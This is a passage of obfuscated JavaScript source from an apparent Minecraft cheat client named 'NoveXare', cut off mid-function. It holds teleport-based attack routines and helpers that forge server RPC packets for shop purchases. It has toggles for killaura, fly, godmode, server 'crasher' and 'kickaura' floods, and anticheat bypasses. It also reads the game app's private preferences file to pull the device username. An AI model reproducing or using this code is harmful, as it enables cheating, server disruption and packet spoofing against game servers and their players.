    y: _0x4e5640.y + InfiniteAura_yoffset / 5,
    z: _0x4e5640.z + _0x197256
  };
  let _0x233764 = _0x25453a;
  if (func_mode.InfiniteAura_mode == 0) {
    setPos(_0x4e5640.x + _0x197256, _0x4e5640.y + InfiniteAura_yoffset / 5, _0x4e5640.z + _0x197256);
  }
  if (func_mode.InfiniteAura_mode == 1) {
    setMotion(_0x4e5640.x + _0x197256 - InfiniteAura_backPos.x, _0x4e5640.y + InfiniteAura_yoffset / 5, _0x4e5640.z + _0x197256 - InfiniteAura_backPos.z);
  }
  if (func_mode.InfiniteAura_mode == 2) {
    executePluginCommand("/ww tp " + _0x233764.x + " " + _0x233764.y + " " + _0x233764.z);
  }
  if (func_mode.InfiniteAura_mode == 3) {
    callModule(5, JSON.stringify(_0x233764));
  }
  if (func_mode.InfiniteAura_mode == 4) {
    sendMovePlayer({
      id: self_id,
      pos: {
        x: _0x4e5640.x + _0x197256,
        y: _0x4e5640.y + InfiniteAura_yoffset / 5,
        z: _0x4e5640.z + _0x197256
      },
      mode: 0,
      ground: true,
      rot: {
        pitch: 0,
        yaw: 0
      },
      yHeadRot: 0
    });
  }
  if (InfiniteAura_click) {
    buildBlock(self_id, _0x4e5640.x + _0x197256, _0x4e5640.y, _0x4e5640.z + _0x197256, 1);
    if (func_mode.InfiniteAura_mode == 4) {
      sendPlayerAction({
        id: self_id,
        pos: {
          x: _0x4e5640.x + _0x197256,
          y: _0x4e5640.y + InfiniteAura_yoffset / 5,
          z: _0x4e5640.z + _0x197256
        },
        value: 1,
        type: 25
      });
    }
  }
  if (InfiniteAura_amove) {
    setMotion(0, 0.42, 0);
  }
  InfiniteAura_num_r--;
};
const hexToString = _0x180d14 => {
  let _0x486027 = "";
  for (let _0x4e1e56 = 0; _0x4e1e56 < _0x180d14.length; _0x4e1e56 += 2) {
    _0x486027 += String.fromCharCode(parseInt(_0x180d14.substr(_0x4e1e56, 2), 16));
  }
  return _0x486027;
};
const findPath = (_0x26c136, _0x5efe00, _0x484d32 = 0.5) => {
  let _0x1e3070 = [];
  let _0x28d74e = getPlayerAngle(_0x26c136, _0x5efe00, "yaw_pos");
  let _0x435195 = getPlayerAngle(_0x26c136, _0x5efe00, "pitch_pos");
  for (let _0x4c80b9 = 0; _0x4c80b9 < getDistance(_0x26c136, _0x5efe00); _0x4c80b9 += _0x484d32) {
    var _0x3e1059 = {
      yaw: _0x28d74e,
      pitch: -_0x435195
    };
    let _0x4e9b1e = getDisplacement(-_0x4c80b9, _0x26c136, _0x3e1059);
    var _0x187257 = {};
    _0x187257.x = Math.round(_0x4e9b1e.x);
    _0x187257.y = Math.round(_0x4e9b1e.y);
    _0x187257.z = Math.round(_0x4e9b1e.z);
    _0x1e3070.push(_0x187257);
  }
  return _0x1e3070;
};
const stringToHex = _0x383269 => {
  let _0x7fc0ea = "";
  for (let _0x5bc36c = 0; _0x5bc36c < _0x383269.length; _0x5bc36c++) {
    _0x7fc0ea += _0x383269.charCodeAt(_0x5bc36c).toString(16);
  }
  return _0x7fc0ea;
};
const getHealth = (_0x1ba68f, _0x36ddd7) => {
  var _0x3e1dec = getEntityAttribute(_0x1ba68f, "minecraft:health");
  var _0x31caef = _0x3e1dec.current;
  var _0x5f4b44 = _0x3e1dec.max;
  const _0x4d3642 = _0x31caef / _0x5f4b44;
  switch (_0x36ddd7) {
    case 0:
      return _0x4d3642.toFixed(2) * 100 + "%%";
    case 1:
      let _0x5946d7 = "§c";
      for (let _0x337236 = 0; _0x337236 < Math.floor(_0x4d3642 * 20); _0x337236++) {
        _0x5946d7 += "❤";
      }
      return _0x5946d7 + "§r";
    case 2:
      return "§c❤§rx" + Math.floor(_0x31caef);
    case 3:
      return Math.floor(_0x31caef) + "/" + Math.floor(_0x5f4b44);
    default:
      return _0x31caef;
  }
};
const addTP = (_0x51e2ce, _0x38887b, _0x5a4d24, _0x37a4c9) => {
  const _0x5d7e47 = getEntityPos(self_id);
  for (let _0x28bf79 = 0; _0x28bf79 < _0x37a4c9; _0x28bf79++) {
    tp_list.push([_0x51e2ce, _0x38887b, _0x5a4d24]);
    tp_list.push([_0x5d7e47.x, _0x5d7e47.y, _0x5d7e47.z]);
  }
};
const randomStr = _0x4aace8 => {
  var _0x492ff8 = "";
  for (let _0x262b34 = 0; _0x262b34 < _0x4aace8; _0x262b34++) {
    const _0x43ef0a = getRandomNum(0, 5);
    if (_0x43ef0a == 0) {
      _0x492ff8 += "?";
    }
    if (_0x43ef0a == 1) {
      _0x492ff8 += "!";
    }
    if (_0x43ef0a == 2) {
      _0x492ff8 += "/";
    }
    if (_0x43ef0a == 2) {
      _0x492ff8 += "\\";
    }
    if (_0x43ef0a == 2) {
      _0x492ff8 += "$";
    }
  }
  return _0x492ff8;
};
const formatHex = _0x1ee196 => _0x1ee196.replace(/\s+/g, "").toLowerCase();
const combineBuyPacket = (_0x5af19b, _0x6b1587) => {
  const _0x417398 = stringToHex("ModEventC2S");
  const _0x734526 = stringToHex("HYTShopMod");
  const _0x3db5ca = stringToHex("good" + _0x6b1587);
  const _0x25c995 = stringToHex("page" + _0x5af19b);
  const _0x5d5912 = "93 C4 0B" + _0x417398 + "94 C4 0A" + _0x734526 + "C4 16 48 59 54 53 68 6F 70 4D 6F 64 43 6C 69 65 6E 74 53 79 73 74 65 6D C4 0C 42 75 79 47 6F 6F 64 45 76 65 6E 74 82 C4 04 67 6F 6F 64 C4 05" + _0x3db5ca + "C4 04 70 61 67 65 C4 05" + _0x25c995 + "C0";
  return formatHex(_0x5d5912);
};
const HYTShopMod = (_0x4fdb6f = "1", _0x2ef860 = "1") => sendRpc(98247598, combineBuyPacket(_0x4fdb6f, _0x2ef860));
const stringToUtf8Hex = _0x596862 => {
  let _0x1661af = "";
  for (let _0x3c5d86 = 0; _0x3c5d86 < _0x596862.length; _0x3c5d86++) {
    let _0x15bcbe = _0x596862.charCodeAt(_0x3c5d86);
    if (_0x15bcbe < 128) {
      _0x1661af += _0x15bcbe.toString(16).padStart(2, "0");
    } else if (_0x15bcbe < 2048) {
      _0x1661af += (_0x15bcbe >> 6 | 192).toString(16).padStart(2, "0");
      _0x1661af += (_0x15bcbe & 63 | 128).toString(16).padStart(2, "0");
    } else if (_0x15bcbe < 55296 || _0x15bcbe >= 57344) {
      _0x1661af += (_0x15bcbe >> 12 | 224).toString(16).padStart(2, "0");
      _0x1661af += (_0x15bcbe >> 6 & 63 | 128).toString(16).padStart(2, "0");
      _0x1661af += (_0x15bcbe & 63 | 128).toString(16).padStart(2, "0");
    } else {
      _0x3c5d86++;
      _0x15bcbe = 65536 + ((_0x15bcbe & 1023) << 10) | _0x596862.charCodeAt(_0x3c5d86) & 1023;
      _0x1661af += (_0x15bcbe >> 18 | 240).toString(16).padStart(2, "0");
      _0x1661af += (_0x15bcbe >> 12 & 63 | 128).toString(16).padStart(2, "0");
      _0x1661af += (_0x15bcbe >> 6 & 63 | 128).toString(16).padStart(2, "0");
      _0x1661af += (_0x15bcbe & 63 | 128).toString(16).padStart(2, "0");
    }
  }
  return _0x1661af;
};
const indexToHex = _0x3175ef => _0x3175ef.toString(16).padStart(2, "0");
const HexToFormat = _0x26fbba => {
  let _0x2d8ffb = "";
  let _0x3ca31b = _0x26fbba.split("");
  for (let _0x5ac8d8 in _0x3ca31b) {
    let _0x1c4dba = _0x3ca31b[_0x5ac8d8].toUpperCase();
    if (_0x5ac8d8 != _0x3ca31b.length - 1) {
      if (_0x5ac8d8 % 2 == 1) {
        _0x2d8ffb += _0x1c4dba + " ";
      } else {
        _0x2d8ffb += _0x1c4dba;
      }
    } else {
      _0x2d8ffb += _0x1c4dba;
    }
  }
  if (remark_hex) {
    let _0x166efd = _0x2d8ffb.split(" ");
    let _0x33aae7 = "";
    for (let _0x8fdd10 in _0x166efd) {
      _0x33aae7 += _0x166efd[_0x8fdd10] + "(" + hexToString(_0x166efd[_0x8fdd10]) + ") ";
    }
    return _0x33aae7;
  } else {
    return _0x2d8ffb;
  }
};
const BJD_NBedwarsBuyItemEvent = (_0x38e15c = "方块", _0x3d0824 = 0) => {
  const _0x1b799a = "93 C4 0B" + stringToHex("ModEventC2S") + "94 C4 08 48 75 64 41 64 64 6F 6E C4 14";
  const _0x4d308b = stringToHex("HudAddonClientSystem") + "C4 14";
  const _0x16e26a = stringToHex("NBedwarsBuyItemEvent") + "82 C4 04 73 68 6F 70 C4 ";
  const _0x3ccff7 = stringToUtf8Hex(_0x38e15c);
  const _0x5d1bd3 = (_0x3ccff7.length / 2).toString(16).padStart(2, "0");
  const _0x51a857 = _0x1b799a + _0x4d308b + _0x16e26a + _0x5d1bd3 + _0x3ccff7 + "C4 05 69 6E 64 65 78" + indexToHex(_0x3d0824) + "C0";
  sendRpc(98247598, formatHex(_0x51a857));
};
var key_bind_list = [];
const resList = ["minecraft:iron_ingot", "minecraft:diamond", "minecraft:gold_ingot", "minecraft:emerald"];
var bind_func = {};
var cleaner_path = getResource() + "/NoveXare/Cleaner.json";
var NoveXare_path = getResource() + "/NoveXare";
var config_path = getResource() + "/NX_Config";
var current_ui = JSON.parse(readFile(getResource() + "/ui/ui_definition.json"));
var tp_list = [];
var motion_list = [];
var temp_pos = {
  x: 0,
  y: 0,
  z: 0
};
var chest_pos = [];
var destroy_list = [];
var isDestroy = false;
var destroy_namespace = null;
var drop_list = [];
var sound_file = null;
var surround_all_entity = false;
var other_user = null;
var lag_last_tick = 1;
var tickCounter = 0;
let f_jump = false;
var default_size = {
  x: 0.6,
  y: 1.8
};
var temp_size = {
  x: 0.6,
  y: 1.8
};
const type = {
  pickaxe: 2,
  axe: 3,
  sword: 4
};
const texture = {
  wooden: 0,
  golden: 0,
  leather: 1,
  chainmail: 2,
  stone: 1,
  iron: 3,
  diamond: 4,
  netherite: 5
};
var self_id = getUserID(other_user);
var last_tick_id = getUserID(other_user);
var last_tick_heal = 20;
var last_tick_pos = getEntityPos(self_id);
var last_world_player = [];
let gm_pos = {};
let gm_mot = {};
var target_name = "";
var scaffold_pitch = false;
var regex = ["player.", "entity.", "主城", "商店", "[LV", "CIT-", "ˉ", "－", "%", "-", "%"];
var keyword = ["kick", "movemcpkick", "rank", "music", "setcan"];
var surround_sound_vec = 1;
var surround_exclude_self = false;
var keyword2 = [];
var send_keyword = ["pongggg", "clicked"];
var send_keyword2 = [];
var receive_keyword = [];
var receive_keyword2 = [];
var clear_config = JSON.parse(readFile(cleaner_path));
const temp = clear_config.map(_0x1502fc => _0x1502fc.namespace);
var last_bps = 0;
var lasttick_mot_y = 0;
var freecam_pos = {};
var fakemove_pos = {};
var RunAway_pos = {};
var scaffold_more = false;
var armor_slot = 0;
var rpc_t = 0;
var shift_tick_r = 0;
var shift_tick = 0;
var self_pos = {
  x: 0,
  y: 0,
  z: 0
};
var replace_block = false;
var killaura_empty = 0;
var sound_data = [];
var goto_pos = null;
var surround_sound_num = 1;
const color_list = {};
const color = ["[白]", "[橙]", "None", "None", "[黄]", "[绿]", "None", "None", "None", "[青]", "[紫]", "[蓝]", "None", "None", "[红]", "None"];
var kills = 0;
var seconds = 0;
var ticks = 0;
var lag_t = 0;
var block_ac = false;
var target_upside_down = false;
var block_ac_select = false;
const rgb_color = "4c6e2a3b195d591b3a2e6c4".split("");
var rgb_l = 0;
var rgb_t = 0;
var rgb_cycle = 2;
var Edit_Y = 85;
var isBlockin = false;
var tp_back = true;
var gm_local = false;
var t_c = 0;
var t_b = 0;
var jump_length = 5;
var arrow_rot = {};
var team_origin = false;
var surround_sound_yaw = -180;
var select_slot = 0;
var CurrentArmor = {};
var last_PyRpc = {};
var again_item = ["easecation:all_games", "minecraft:emerald"];
var boostSpeed = false;
var autobuy_block = false;
var autobuy_block_count = 3;
var autobuy_sword = false;
var autobuy_armor = false;
var autobuy_enchant = false;
var RepeatRpc_times = 1;
var entity_keyword = [];
var check_hide = true;
const GROUND_MOTION_Y = -0.07840000092983246;
const JUMP_STRENGTH = 0.41999998688697815;
const AIR_RESISTANCE = 0.91;
const AIR_SPEED = 0.05;
const GROUND_RESISTANCE = 0.6;
const GROUND_SPEED = 0.1;
const ERROR = 1e-7;
let onGround = true;
let resistance = GROUND_RESISTANCE;
let speed = GROUND_SPEED;
var hasBrought = {
  enchant: {
    sharp: 0,
    protect: 0
  },
  armor: 0
};
var edit_suffix = "This is a suffix";
var NoveXare_Config = {
  cmd: [],
  binds: {},
  key_binds: []
};
var neglect_exclude = false;
var rocker_bhop_heigh = 0.42;
var line_particle_offset = 0;
var line_particle_type = 3;
var line_particle_size = 1;
var avoid_remove = false;
var aim_attack_cps = 10;
var aim_t0 = -Infinity;
var aim_t1 = 0;
var rider_random = false;
var isOpenChest = false;
var rider_heigh = 1;
var ac_pos = [];
var attack_action = true;
var func_mode = {};
var target_list = [];
var white_list = [];
var max_target_num = 3;
var max_distance = 6;
var min_distance = 0;
var includeMob = false;
var includePlayer = true;
var limit_y = 255;
var limit_min_y = 0;
var NoHeigh = false;
var infinite_distance = false;
var check_size = true;
var check_rot = true;
var check_health = true;
var bypass_bjd = true;
var gradual_up = true;
var show_no_intercept = false;
var show_intercept = false;
var whilelist_range = 6;
func_mode.select_mode = 0;
func_mode.nofall_mode = 0;
func_mode.gg_mode = 0;
var surround_particle_heigh = 0;
var surround_particle_length = 0;
var particle_surround_speed = 5;
var bhop_heigh = 0.4;
var killaura_boost = 1;
var killaura_max_cps = 10;
var killaura_min_cps = 10;
var killaura_Fov = 90;
var killaura_distance = 4;
var killaura_infinite = false;
var killaura_d_1 = 0;
var killaura_d_2 = -Infinity;
var killaura_auto_close = true;
var killaura_crit = false;
var bypass_ec_attack = false;
var bhop_speed = 5;
var record_speed = {};
var record_water = {};
var record_lava = {};
var gm_tick = 0;
var gm_move = false;
var gm_ground = false;
var InfiniteAura_random = false;
var InfiniteAura_packet = 3;
var InfiniteAura_backY = false;
var InfiniteAura_amove = false;
var InfiniteAura_distance = 100;
var InfiniteAura_move = 1;
var InfiniteAura_delay = 1;
var InfiniteAura_repeat = true;
var min_run_heal = 10;
func_mode.low_health_operate_mode = 0;
var assistaim_aim_speed = 20;
var assistaim_predict = false;
var assistaim_lock = false;
var assistaim_silent = false;
var assistaim_distance = 5;
var assistaim_Fov = 90;
var assistaim_random_y = 0;
var assistaim_random_xz = 0;
const assistaim_speed = 100;
const assistaim_gravity = 16;
var assistaim_test = false;
var assistaim_throw = false;
var assistaim_y = 0;
var surround_loop = false;
func_mode.assistaim_mode = 1;
func_mode.pyrpc_mode = 0;
var lockback_length = 3;
var lockback_heigh = 2;
var lockback_yaw = -180;
var surround_particle_yaw = -180;
var surround_speed = 5;
var surround_sound_distance = 5;
var max_drop_item = 36;
var drop_delay = 0;
var drop_delay_t = 0;
var sprint_speed = 5;
var sprint_horizontal = false;
var trace_min_dis = 5;
var play_pos_list = [];
var trace_speed = 5;
var team = "NoveXare";
var fly_speed = 15;
var fly_run = false;
var fly_mot = true;
var fly_includeY = false;
var fly_up_down = false;
var fly_set_ud = 10;
var fly_ud = 1;
var fly_block = false;
var text = "Lmao";
var chat_keyword = [];
var tip_keyword = ["refresh", "player", "unload", "upload", "vip", "music", "textboard", "scoreboard", "start", "condition"];
var blackhole_dis = 3;
var slowdown_speed = 5;
var wtap_distance = 3;
var wtap_only_ground = false;
var wtap_speed = 5;
var kickaura_times = 500;
var crasher_times = 500;
var kickaura_multi = true;
var crasher_multi = true;
var kickaura_for = 50;
var crasher_for = 50;
func_mode.crasher_mode = 0;
var scaffold_length = 1;
var scaffold_mode = false;
var scaffold_block = 1;
var block_namespace = "minecraft:wool";
var scaffold_hyt = false;
var scaffold_move = false;
var scaffold_up = false;
var scaffold_auto_block = false;
var scaffold_findPath = false;
var hitbox_x = 2;
var hitbox_y = 1.8;
func_mode.cleaner_mode = 0;
func_mode.health_mode = 0;
var blurred_match = false;
var keep_y = false;
var rec_y = 0;
var InfiniteAura_back = true;
var InfiniteAura_switch_delay = 1;
var InfiniteAura_switch_delay_r = 0;
var InfiniteAura_list = [];
var InfiniteAura_target = [];
var InfiniteAura_tick = 2;
var tick = 0;
var move_tick = 0;
var InfiniteAura_num = 1;
var InfiniteAura_num_r = 0;
func_mode.InfiniteAura_mode = 4;
func_mode.server_mode = 1;
func_mode.fakelag_mode = 0;
func_mode.hyt_mode = 0;
func_mode.draw_mode = 0;
var InfiniteAura_backPos = null;
var InfiniteAura_backMotion = null;
func_mode.fly_mode = 0;
func_mode.sprint_mode = 0;
var cpvp = false;
func_mode.cpvp_mode = 0;
var throw_wall = false;
var fly_only_fly = false;
var longjump_x = 5;
var longjump_y = 0.5;
var lagback_pos = [];
var lagback_run = false;
var lagback_y = 0.8;
var lagback_derp = false;
var circulateSender = false;
var RepeatRpc_ticks = 1;
var custom_kb_x = 1;
var custom_kb_y = 0.5;
var packet_send = true;
var packet_receive = false;
var packet_tip = false;
var packet_record = false;
var show_pyrpc_id = true;
var content = "NoveXare YYDS";
var auto_text_delay = 1;
var auto_text_random = false;
var auto_text_num = 1;
var text_d_2 = -Infinity;
var text_d_1 = 0;
var bed_list = [];
var surround_all = true;
var body_rot_speed = 5;
var head_rot_speed = 5;
var head_rot = false;
var body_rot = false;
var lock_head = false;
var random_num = 0;
var random_delay = 0;
var random_rot = false;
var regex_enable = true;
var rush_length = 5;
var bjd_jump = false;
var up_down_speed = 1;
var max_mot_y = 0.42;
var build_distance = 4;
var build_tick = 10;
var build_t = 0;
var build_list = [];
var build_success = true;
var save_to_file = false;
var move_fly = false;
var fightbot_imitateMove = false;
var gm_y = 0;
var gm_cycle = 1;
var gm_delay = 0;
var gm_xz = false;
var gm_count = 5;
func_mode.godmode_mode = 0;
var rocker_speed = 8;
var rocker_bhop = false;
var rocker_ahop = false;
var imitateMove = false;
var imitateMove = false;
func_mode.rocker_mode = 0;
func_mode.move_mode = 0;
func_mode.look_tp_mode = 0;
func_mode.surround_mode = 0;
var use_times = 1;
var select_t = 0;
var break_bed = true;
var break_chest = true;
var through_wall = true;
var autosave_fake_block = false;
var autosave_near_block = false;
var attack_particle_size = 20;
var particle_size = 1;
var attack_particle_type = 3;
var surround_particle_type = 19;
var surround_particle_size = 1;
func_mode.freecam_mode = 0;
var only_walk = 0;
var destroy_size = 1;
var SelectBomb = false;
var SelectCrystal = false;
var excludeFeet = false;
var b_excludeFeet = false;
var death_pos = {};
var show_cps = true;
var isBedbuild = false;
var bomb_delay = 1;
var crystal_delay = 1;
var crystal_acount = 1;
var bow_speed = 0.5;
var CrystalAura_distance = 3;
var arrow_particle_type = 12;
var drop_motion = 1.3;
var CrystalTP = false;
func_mode.avoid_mode = 0;
var avoid_distance = 5;
var current_mine_num = 0;
var mine_num = 20;
var mine_distance = 5;
var steal_delay = 0.5;
var click_mode = false;
var InfiniteAura_click = true;
var InfiniteAura_backclick = true;
var InfiniteAura_yoffset = 0;
var scaffold_origin_block = false;
var fightbot_distance = 4;
var fightbot_speed = 5;
var fightbot_pot_health = 0;
var fightbot_jump = false;
var fightbot_killaura = true;
var fightbot_aimbot = false;
var fightbot_wtap = false;
var fightbot_combo = false;
var fightbot_height = 0.38;
var fightbot_scaffold = false;
var attack_sound_type = 81;
var surround_sound_type = 81;
var attack_sound_level = 0;
var surround_sound_level = 0;
var fightbot_jump_rate = 33;
var fightbot_move_rate = 33;
var fightbot_fishhook_rate = 0;
var fightbot_snowball_rate = 0;
var fightbot_random_jump = false;
var fightbot_random_move = false;
var reverse_lag = false;
var back_select = false;
var attack_tick = 0;
var attack_ticks = 0;
var isAttacking = false;
var attack_frequency = 0;
var empty_attack_frequency = 0;
var first_attack_health = 0;
var last_attack_health = Infinity;
var last_attack_target = null;
var show_real_cps = false;
var reverse_target = false;
var jump_strength = 42;
var cleaner_slot = 35;
var no_kb_resistance_h = 100;
var no_kb_resistance_v = 100;
var throwable_particle_gravity = 20;
var throwable_particle_speed = 100;
var throwable_particle_length = 200;
var throwable_particle_type = 55;
var throwable_particle_offset = 20;
var throwable_particle_target = true;
var throwable_particle_density = 10;
func_mode.throwable_particle_mode = 0;
var low_health_operate_sword = false;
var check_wall = false;
var check_ground = false;
var check_name = true;
var selectitems = [];
var select_use = false;
var select_delay = 0;
var last_tick_item = {};
var fightbot_autoweapon = false;
var fps_rate = 10;
var freecam_show = false;
var freecam_dis = false;
var targetStrafe = false;
var targetStrafe_distance = 1.5;
var rocker_func = {};
var airjump_func = {};
var flexibleMove_speed = 5;
var targetStrafe_relative = true;
var destroy_up = false;
var destroy_packet = false;
var targetStrafe_range = 180;
func_mode.anti_staff_mode = 0;
func_mode.anti_mode = 0;
func_mode.fakeTip_mode = 0;
var current_poem = "";
var remark_hex = false;
var tip_t1 = 201;
var balance_timer_t = 0;
var balance_timer_st = false;
var calculate_t = 0;
var variable_player = false;
var variable_entity = false;
var variable_id = false;
var edit_kickaura = "";
var kickaura_repeat = 50;
var swing_speed = 17;
func_mode.set_time = 0;
var switch_delay = 0;
var switch_delay_t = 0;
var isBinding = null;
var cleaner_bow = false;
var da_bow = false;
var action_times = 1;
var edit_action_id = 0;
var action_ticks = 0;
var action_tick = 0;
var use_action_config = false;
var killaura = false;
var auto_target = true;
var show_tip = true;
var bhop = false;
var auto_speed = false;
var low_health_operate = false;
var click_target = false;
var click_whitelist = false;
var no_water_slowdown = false;
var show_target_list = false;
var rider = false;
var show_script_tip = true;
var show_pos = false;
var show_item = true;
var show_speed = false;
var jesus = false;
var lock_target = false;
var teams = false;
var team_origin = false;
var assistaim = false;
var click_team = false;
var lockback = false;
var surround = false;
var auto_sprint = false;
var trace = false;
var suspend = false;
var InfiniteAura = false;
var godmode = false;
var fly = false;
var safewalk = false;
var kill_message = false;
var blackhole = false;
var scaffold = false;
var slowdown = false;
var airjump = false;
var wtap = false;
var crasher = false;
var hitbox = false;
var auto_attack = false;
var disabler = false;
var cleaner = false;
var longjump = false;
var lagback = false;
var custom_kb = false;
var auto_weapon = false;
var packet_manager = false;
var auto_text = false;
var derp = false;
var attack_self = false;
var RandomLock = false;
var open_shop = false;
var anti_touch = false;
var get_bed_pos = false;
var auto_save = false;
var fast_build = false;
var record_target = false;
var no_fall = false;
var rocker = false;
var show_hurt = true;
var breaker = false;
var blockin = false;
var freecam = false;
var auto_bed = false;
var entity_particle = false;
var surround_particle = false;
var better_jump = false;
var click_destroy = false;
var auto_destroy = false;
var AutoCrystal = false;
var AutoBomb = false;
var remove_item = false;
var RunAway = false;
var bow_trace = false;
var arrow_fly = false;
var CrystalAura = false;
var arrow_particle = false;
var remove_notPlayer = false;
var remove_player = false;
var farmaura = false;
var drop_res = false;
var pvp_dalao = false;
var show_activity = false;
var show_click_block = false;
var drop_armor = false;
var attack_aim = false;
var fakelag = false;
var lag_tick = 10;
var show_death = false;
var respawn_local = false;
var attack_particle = false;
var auto_void = false;
var tower = false;
var hover = false;
var chestaura = false;
var show_key_down = false;
var show_key_up = false;
var show_client_message = false;
var show_ui_event = false;
var show_command = false;
var show_send_command = false;
var show_target_dis = false;
var show_player_list = false;
var show_world_tip = false;
var show_time = false;
var show_kill_num = false;
var show_health = false;
var show_attack_rate = false;
var show_ping = false;
var rgb_tip = false;
var fun_drop = false;
var fun_hot = false;
var fun_other_user = false;
var fun_drop_sword = false;
var sleepaura = false;
var bellaura = false;
var avoid_throw = false;
var auto_mine = false;
var chest_steal = false;
var auto_door = false;
var criticals = false;
var fightbot = false;
var attack_sound = false;
var surround_sound = false;
var InteractAura = false;
var ChargeAura = false;
var auto_stuck = false;
var auto_destroy_foot = false;
var chat_manager = false;
var avoid_attack = false;
var auto_use = false;
var auto_click = false;
var check_axe = false;
var no_receive_packet = false;
var blink = false;
var auto_jump = false;
var no_kb = false;
var throwable_particle = false;
var kickaura = false;
var select_hotbar = false;
var auto_select = false;
var autoarmor = false;
var AutoGG = false;
var line_particle = false;
var autobuy = false;
var flexibleMove = false;
var anti_staff = false;
var keep_void = false;
var FakeBuilder = false;
var ClickBlock = false;
var RainbowWool = false;
var FakeTip = false;
var balance_timer = false;
var show_variable = false;
var show_destroy_block = false;
var click_tp = false;
var night_vision = false;
var modify_swing = false;
var modify_time = false;
var show_game_info = false;
var show_chunk = false;
var chat_suffix = false;
var fake_move = false;
var draw_move = false;
var auto_shift = false;
var auto_swing = false;
var auto_swimming = false;
var action_manager = false;
var max_damage = 0;
var max_armor = [];
var ping = 0;
var ping_1 = 0;
var ping_2 = 0;
var StartArmor = false;
var derp_p_r = 90;
var derp_y_r = -180;
var self_can_see = false;
const username = getData("NoveXare_User", "");
const pwd = getData("NoveXare_Pwd", "");
const file = read_file("/data/data/top.bienvenido.saas.i18n/app_split/com.netease.x19/0/shared_prefs/com.mojang.minecraftpe.MainActivity.xml");
const file2 = read_file("/data/data/com.netease.x19/shared_prefs/com.mojang.minecraftpe.MainActivity.xml");
const device = getText(file == "" ? file2 : file, "username\">", "</string>");
const XxxGBRCxxX = JSON.parse(getData("NoveXare_Verify", "{}"));
globalThis.onTickEvent = function () {
  if (disabler) {
    return;
  }
  var _0x2c4c04 = [];
  self_id = getUserID(other_user);
  self_pos = getEntityPos(self_id);
  const _0x5c8ff1 = getEntityAttribute(self_id, "minecraft:health");
  if (_0x5c8ff1.current - last_tick_heal > 10) {
    if (show_death) {
      clientMessage(string_format("§3§l[NoveXare] §r§7>>> §rTip §7>>>§r You are Dead - DeathPos: {}, {}, {}", Math.round(death_pos.x), Math.round(death_pos.y), Math.round(death_pos.z)));
    }
    if (respawn_local) {
      setPos(death_pos.x, death_pos.y, death_pos.z);
    }
    if (respawn_local) {
      setMotion(0, 0, 0);
    }
  } else if (_0x5c8ff1.current < last_tick_heal) {
    death_pos = self_pos;
  }
  var _0x1b6f06 = getEntityMotion(self_id);
  var _0x513051 = getEntityRot(self_id);
  var _0x2ee94b = getDistance(self_pos, last_tick_pos) / 0.05;
  var _0x177706 = getHorizontalDistance(self_pos, last_tick_pos) / 0.05;
  var _0x43a81c = getSpeed(self_id);
  var _0x25c02a = getPlayerBlockPos(self_id);
  var _0x2ecb85 = getEntityCarriedItem(self_id);
  var _0x116e53 = getEntityIsGround(self_id);
  if (_0x5c8ff1.current < last_tick_heal) {
    last_tick_heal = _0x5c8ff1.current;
  }
  var _0x4a1836 = getWorldPlayerID();
  if (calculate_t > 20) {
    max_damage = getEntityMaxDamage(self_id);
    max_armor = [getEntityMaxArmor(self_id, "helmet"), getEntityMaxArmor(self_id, "chestplate"), getEntityMaxArmor(self_id, "leggings"), getEntityMaxArmor(self_id, "boots")];
    ping_1 = Date.now();
    curl_get("https://www.baidu.com", {}, (_0xc9c953, _0x2ffeaf) => globalThis.ping_2 = Date.now());
    ping = Math.abs(ping_2 - ping_1);
    calculate_t = 0;
  }
  if (draw_move && target_list.length > 0) {
    target_list.map(_0xc4a55d => {
      const _0x38fb6b = predictEntityPos(getEntityMotion(_0xc4a55d), getEntityPos(_0xc4a55d), move_tick);
      if (func_mode.draw_mode == 0) {
        drawParticle(55, _0x38fb6b.x, _0x38fb6b.y, _0x38fb6b.z, 1);
      }
      if (func_mode.draw_mode == 1) {
        const _0x405b50 = findPath(getEntityPos(_0xc4a55d), _0x38fb6b);
        _0x405b50.map(_0x3fe80e => drawParticle(55, _0x3fe80e.x, _0x3fe80e.y, _0x3fe80e.z, 1));
      }
    });
  }
  if (show_chunk) {
    var _0x29c1ad = {};
    _0x29c1ad.x = Math.floor(self_pos.x / 16);
    _0x29c1ad.z = Math.floor(self_pos.z / 16);
    let _0x3efe34 = _0x29c1ad;
    var _0x3739ea = {
      x: _0x3efe34.x * 16,
      z: _0x3efe34.z * 16
    };
    let _0x13f1a7 = _0x3739ea;
    var _0x308008 = {
      x: (_0x3efe34.x + 1) * 16,
      z: (_0x3efe34.z + 1) * 16
    };
    let _0xeab788 = _0x308008;
    for (let _0x11a971 = 0; _0x11a971 < 16; _0x11a971++) {
      drawParticle(55, _0x13f1a7.x + _0x11a971, self_pos.y, _0x13f1a7.z, 1);
    }
    for (let _0x599c7a = 0; _0x599c7a < 16; _0x599c7a++) {
      drawParticle(55, _0x13f1a7.x, self_pos.y, _0x13f1a7.z + _0x599c7a, 1);
    }
    for (let _0x477fec = 0; _0x477fec < 16; _0x477fec++) {
      drawParticle(55, _0xeab788.x - _0x477fec, self_pos.y, _0xeab788.z, 1);
    }
    for (let _0x57af62 = 0; _0x57af62 < 16; _0x57af62++) {
      drawParticle(55, _0xeab788.x, self_pos.y, _0xeab788.z - _0x57af62, 1);
    }
    _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "区块坐标: " + _0x3efe34.x + "， " + _0x3efe34.z);
  }
  if (auto_target && (!lock_target || !findEntity(target_list[0])) && switch_delay_t > switch_delay) {
    if (target_list.length > 0) {
      let _0x514d5d = getEntityAttribute(target_list[0], "minecraft:health");
      if (_0x514d5d.current <= 0 && !findEntity(target_list[0])) {
        if (kill_message) {
          sendChatMessage(text);
        }
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Killed A Target §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + target_name);
        }
        kills++;
        target_list.splice(0, 1);
      } else {
        target_name = getEntityName(target_list[0]);
      }
    }
    target_list = getTargets(self_id, max_distance, max_target_num);
    switch_delay_t = 0;
  }
  if (keep_void && _0x5c8ff1.current < 5 && _0x1b6f06.y < -0.0784 && _0x116e53) {
    setPos(self_pos.x, self_pos.y, self_pos.z);
  }
  if (AutoGG) {
    for (let _0xf1c6a2 of again_item) {
      if (func_mode.gg_mode == 0) {
        dropPlayerInventorySlot(self_id, getItem(self_id, _0xf1c6a2, -1, "一局"));
      }
      if (func_mode.gg_mode == 1) {
